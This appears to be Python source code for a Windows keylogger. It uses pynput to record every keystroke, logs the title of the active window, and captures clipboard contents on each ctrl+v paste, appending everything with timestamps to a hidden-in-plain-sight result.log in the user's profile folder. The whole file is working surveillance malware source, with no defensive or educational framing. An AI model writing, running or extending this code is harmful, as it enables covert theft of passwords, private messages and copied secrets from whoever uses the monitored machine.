import os
import unicodedata
from datetime import datetime
from pynput import keyboard as kb
from pynput.keyboard import Key
import keyboard
import pyperclip
import win32gui

current_window = None

special_keys = {
    Key.alt_l: "",
    Key.alt_r: "",
    Key.backspace: " [Backspace] ",
    Key.caps_lock: "",
    Key.cmd_l: " [Win] ",
    Key.ctrl_l: "",
    Key.ctrl_r: "",
    Key.delete: " [Delete] ",
    Key.down: " [Down] ",
    Key.end: "",
    Key.enter: "\n",
    Key.esc: " [Esc] ",
    Key.f1: " [F1] ",
    Key.f10: " [F10] ",
    Key.f11: " [F11] ",
    Key.f12: " [F12] ",
    Key.f2: " [F2] ",
    Key.f3: " [F3] ",
    Key.f4: " [F4] ",
    Key.f5: " [F5] ",
    Key.f6: " [F6] ",
    Key.f7: " [F7] ",
    Key.f8: " [F8] ",
    Key.f9: " [F9] ",
    Key.home: "",
    Key.insert: "",
    Key.left: " [Left] ",
    Key.num_lock: "",
    Key.page_down: "",
    Key.page_up: "",
    Key.pause: "",
    Key.right: " [Right] ",
    Key.scroll_lock: "",
    Key.shift_l: "",
    Key.shift_r: "",
    Key.space: " ",
    Key.tab: " [Tab] ",
    Key.up: " [Up] ",
    Key.media_volume_up: " [Volume Up] ",
    Key.media_volume_down: " [Volume Down] ",
    Key.media_volume_mute: " [Mute] ",
    Key.media_next: " [Next Track] ",
    Key.media_previous: " [Previous Track] ",
    Key.media_play_pause: " [Play/Pause] "
}

def get_active_window():
    try:
        return win32gui.GetWindowText(win32gui.GetForegroundWindow())
    except Exception:
        return "Unknown Window"

def log_window_change():
    global current_window
    new_window = get_active_window()
    if new_window != current_window and new_window.strip():
        current_window = new_window
        path = os.path.join(os.getenv("USERPROFILE"), "result.log")
        with open(path, "a", encoding="utf-8") as file:
            file.write("\n" + ("=" * 50) + "\n" + "[Active Window]: " + current_window  + "\n")


def on_press(key):
    log_window_change()
    path = os.path.join(os.getenv("USERPROFILE"), "result.log")
    with open(path, "a", encoding="utf-8") as file:
        try:
            if key in special_keys:
                file.write(special_keys[key])
            elif key is None:
                file.write("\n" + ("=" * 50) + "\n" + "[Error]: Key press event was None" + "\n" + ("=" * 50) + "\n")
            else:
                char = key.char
                try:
                    unicodedata.name(char)
                    file.write(char)
                except (ValueError, AttributeError):
                    file.write("\n" + ("=" * 50) + "\n" + "[Unknown Key]: " f"\"{str(key)}\"" + "\n" + ("=" * 50) + "\n")
        except AttributeError:
            file.write(str(key))

def copy_clipboard_data():
    log_window_change()
    path = os.path.join(os.getenv("USERPROFILE"), "result.log")
    with open(path, "a", encoding="utf-8") as file:
        clipboard_data = pyperclip.paste()
        if clipboard_data:
            file.write("\n[Clipboard data]: {\n" + clipboard_data + " \n}\n")
        else:
            file.write("\n" + ("=" * 50) + "[Warning]: Clipboard data is empty" + ("=" * 50) + "\n")

def write_date_to_file():
    path = os.path.join(os.getenv("USERPROFILE"), "result.log")
    with open(path, "a", encoding="utf-8") as file:
        current_date = datetime.now().strftime("%m/%d/%Y %H:%M")
        file.write("\n" + ("=" * 50) + "\n[Date]: " + current_date + "\n" + ("=" * 50) + "\n")

write_date_to_file()
keyboard.add_hotkey("ctrl+v", copy_clipboard_data, suppress=False)

with kb.Listener(on_press=on_press) as listener:
    listener.join()
